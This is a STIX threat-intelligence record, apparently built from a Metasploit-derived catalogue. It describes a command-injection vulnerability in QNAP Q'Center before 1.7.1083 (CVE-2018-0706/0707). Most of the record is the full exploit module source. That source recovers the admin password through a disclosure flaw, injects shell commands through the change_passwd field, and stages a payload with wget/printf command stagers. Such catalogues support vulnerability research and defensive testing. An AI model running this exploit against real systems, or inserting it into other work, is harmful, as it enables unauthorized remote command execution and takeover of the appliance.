{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b4cf4cdc-8d2c-497b-86de-6b01012f7663",
    "created": "2024-08-14T17:02:42.714076Z",
    "modified": "2024-08-14T17:02:42.714082Z",
    "name": "\"QNAP QCenter change_passwd Command Execution\"",
    "description": " This module exploits a command injection vulnerability in the `change_passwd` API method within the web interface of QNAP Q'Center virtual appliance versions prior to 1.7.1083.  The vulnerability allows the 'admin' privileged user account to execute arbitrary commands as the 'admin' operating system user.  Valid credentials for the 'admin' user account are required, however this module also exploits a separate password disclosure issue which allows any authenticated user to view the password set for the 'admin' user during first install.  This module has been tested successfully on QNAP Q'Center appliance version 1.6.1075.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/qnap_qcenter_change_passwd_exec.rb",
            "external_id": "qnap_qcenter_change_passwd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.coresecurity.com/advisories/qnap-qcenter-virtual-appliance-multiple-vulnerabilities"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2018/Jul/45"
        },
        {
            "source_name": "reference",
            "url": "https://www.securityfocus.com/archive/1/542141"
        },
        {
            "source_name": "reference",
            "url": "https://www.qnap.com/en-us/security-advisory/nas-201807-10"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => \"QNAP Q'Center change_passwd Command Execution\",\n      'Description'     => %q{\n        This module exploits a command injection vulnerability in the\n        `change_passwd` API method within the web interface of QNAP Q'Center\n        virtual appliance versions prior to 1.7.1083.\n\n        The vulnerability allows the 'admin' privileged user account to\n        execute arbitrary commands as the 'admin' operating system user.\n\n        Valid credentials for the 'admin' user account are required, however,\n        this module also exploits a separate password disclosure issue which\n        allows any authenticated user to view the password set for the 'admin'\n        user during first install.\n\n        This module has been tested successfully on QNAP Q'Center appliance\n        version 1.6.1075.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Ivan Huertas', # Discovery and PoC\n          'bcoles' # Metasploit\n        ],\n      'References'      =>\n        [\n          ['CVE', '2018-0706'], # privesc\n          ['CVE', '2018-0707'], # rce\n          ['EDB', '45015'],\n          ['URL', 'https://www.coresecurity.com/advisories/qnap-qcenter-virtual-appliance-multiple-vulnerabilities'],\n          ['URL', 'https://seclists.org/fulldisclosure/2018/Jul/45'],\n          ['URL', 'https://www.securityfocus.com/archive/1/542141'],\n          ['URL', 'https://www.qnap.com/en-us/security-advisory/nas-201807-10']\n        ],\n      'Platform'        => 'linux',\n      'Arch'            => [ARCH_X86, ARCH_X64],\n      'Targets'         => [['Auto', { }]],\n      'CmdStagerFlavor' => %w[printf bourne wget],\n      'Privileged'      => false,\n      'DisclosureDate'  => '2018-07-11',\n      'DefaultOptions'  => {'RPORT' => 443, 'SSL' => true},\n      'DefaultTarget'   => 0))\n    register_options [\n      OptString.new('TARGETURI', [true, \"Base path to Q'Center\", '/qcenter/']),\n      OptString.new('USERNAME', [true, 'Username for the application', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password for the application', 'admin'])\n    ]\n  end\n\n  def check\n    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'index.html')\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 200 && res.body.include?(\"<title>Q'center</title>\")\n      vprint_error \"Target is not a QNAP Q'Center appliance\"\n      return CheckCode::Safe\n    end\n\n    version = res.body.scan(/\\.js\\?_v=([\\d\\.]+)/).flatten.first\n    if version.to_s.eql? ''\n      vprint_error \"Could not determine QNAP Q'Center appliance version\"\n      return CheckCode::Detected\n    end\n\n    version = Rex::Version.new version\n    vprint_status \"Target is QNAP Q'Center appliance version #{version}\"\n\n    if version >= Rex::Version.new('1.7.1083')\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears\n  end\n\n  def login(user, pass)\n    vars_post = {\n      name:     user,\n      password: Rex::Text.encode_base64(pass),\n      remember: 'false'\n    }\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, '/hawkeye/v1/login'),\n      'ctype'  => 'application/json',\n      'data'   => vars_post.to_json\n    })\n\n    if res.nil?\n      fail_with Failure::Unreachable, 'Connection failed'\n    elsif res.code == 200 && res.body.eql?('{}')\n      print_good \"Authenticated as user '#{user}' successfully\"\n    elsif res.code == 401 || res.body.include?('AuthException')\n      fail_with Failure::NoAccess, \"Invalid credentials for user '#{user}'\"\n    else\n      fail_with Failure::UnexpectedReply, \"Unexpected reply [#{res.code}]\"\n    end\n\n    @cookie = res.get_cookies\n    if @cookie.nil?\n      fail_with Failure::UnexpectedReply, 'Failed to retrieve cookie'\n    end\n  end\n\n  #\n  # Retrieve list of user accounts\n  #\n  def account\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path, '/hawkeye/v1/account'),\n      'cookie' => @cookie\n    })\n    JSON.parse(res.body)['account']\n  rescue\n    print_error 'Could not retrieve list of users'\n    nil\n  end\n\n  #\n  # Login to the 'admin' privileged user account\n  #\n  def privesc\n    print_status 'Retrieving admin user details ...'\n\n    admin = account.first\n    if admin.blank? || admin['_id'].blank? || admin['name'].blank? || admin['new_password'].blank?\n      fail_with Failure::UnexpectedReply, 'Failed to retrieve admin user details'\n    end\n\n    @id = admin['_id']\n    @pw = Rex::Text.decode_base64 admin['new_password']\n    print_good \"Found admin password used during install: #{@pw}\"\n\n    login admin['name'], @pw\n  end\n\n  #\n  # Change password to +new+ for user with ID +id+\n  #\n  def change_passwd(id, old, new)\n    vars_post = {\n      _id: id,\n      old_password: Rex::Text.encode_base64(old),\n      new_password: Rex::Text.encode_base64(new),\n    }\n    send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, '/hawkeye/v1/account'),\n      'query'  => 'change_passwd',\n      'cookie' => @cookie,\n      'ctype'  => 'application/json',\n      'data'   => vars_post.to_json\n    }, 5)\n  end\n\n  def execute_command(cmd, _opts)\n    change_passwd @id, @pw, \"\\\";#{cmd};\\\"\"\n  end\n\n  def exploit\n    login datastore['USERNAME'], datastore['PASSWORD']\n\n    if datastore['USERNAME'].eql? 'admin'\n      @id = @cookie.scan(/_ID=(.+?);/).flatten.first\n      @pw = datastore['PASSWORD']\n    else\n      privesc\n    end\n\n    print_status 'Sending payload ...'\n    execute_cmdstager linemax: 10_000\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-07-11",
    "x_mitre_platforms": [
        "linux'"
    ]
}